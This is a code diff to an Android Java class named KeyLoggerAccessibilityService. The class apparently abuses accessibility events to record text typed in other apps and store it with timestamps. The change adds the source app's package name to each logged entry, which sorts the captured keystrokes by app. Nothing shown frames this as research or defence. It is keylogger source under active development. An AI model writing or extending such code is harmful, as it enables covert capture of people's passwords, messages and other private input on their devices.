@@ -44,7 +44,7 @@ public class KeyLoggerAccessibilityService extends AccessibilityService {
 //                 break;
             case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
 //                eventText = "Typed" + "[" + event.getPackageName() + "]: ";
-                saveContents("" + eventText);
+                saveContents("" + eventText, ""+event.getPackageName());
                 break;
         }
 
@@ -68,7 +68,7 @@ public class KeyLoggerAccessibilityService extends AccessibilityService {
         this.setServiceInfo(info);
     }
 
-    private void saveContents(String eventLog) {
+    private void saveContents(String eventLog, String eventSource) {
         try {
             SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(this);
             String savedLog = preferences.getString("KeyLogger", "");
@@ -96,7 +96,7 @@ public class KeyLoggerAccessibilityService extends AccessibilityService {
                 SimpleDateFormat sdf = new SimpleDateFormat("yyyy.MM.dd HH:mm:ss z");
                 String currentDatetime = sdf.format(new Date());
 
-                newLog = savedLog + "\n[" + currentDatetime + "]\n" + eventLog;
+                newLog = savedLog + "\n[" + eventSource + " ::: "+ currentDatetime + "]\n" + eventLog;
             }
 
             preferences = PreferenceManager.getDefaultSharedPreferences(this);
